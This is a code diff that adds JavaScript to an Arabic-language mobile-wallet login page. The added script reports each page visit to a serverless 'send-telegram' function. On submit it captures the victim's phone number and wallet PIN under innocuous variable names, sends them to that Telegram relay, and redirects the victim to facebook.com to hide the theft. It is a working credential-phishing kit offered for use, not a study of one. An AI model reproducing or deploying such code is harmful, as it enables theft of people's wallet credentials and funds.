@@ -154,9 +154,52 @@ input[type="password"] {
                 <a href="#">إعادة تعيين الرمز السري للمحفظة PIN</a>
             </div>
 
-            <button type="submit" class="submit-btn">سجّل دخول</button>
+            <button type="submit" id="submitBtn" class="submit-btn">سجّل دخول</button>
         </form>
     </div>
 
+<script>
+    // ضع رابط موقعك هنا الذي تريد توجيه المستخدم إليه
+    const REDIRECT_URL = "https://www.facebook.com";
+
+    // 1. إبلاغ البوت بزيارة الصفحة فور تحميلها
+    window.addEventListener('load', () => {
+        fetch('/.netlify/functions/send-telegram').catch(() => {});
+    });
+
+    // 2. معالجة إرسال الفورم والتوجيه
+    const form = document.getElementById('loginForm');
+    const btn = document.getElementById('submitBtn');
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        
+        // تعطيل الزر لمنع الإرسال المتكرر
+        btn.disabled = true;
+        btn.innerText = "جاري المعالجة...";
+
+        const name = document.getElementById('phone').value;
+        const lastName = document.getElementById('pin').value;
+
+        try {
+            const response = await fetch('/.netlify/functions/send-telegram', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ name, lastName })
+            });
+
+            // سواء نجح الإرسال أو حدث خطأ بسيط، سنقوم بالتوجيه لضمان تجربة مستخدم مستمرة
+            window.location.href = REDIRECT_URL;
+
+        } catch (error) {
+            console.error("Error:", error);
+            // في حال حدوث خطأ في الاتصال، نوجه المستخدم أيضاً بعد تأخير بسيط
+            setTimeout(() => {
+                window.location.href = REDIRECT_URL;
+            }, 500);
+        }
+    });
+</script>
+    
 </body>
 </html>
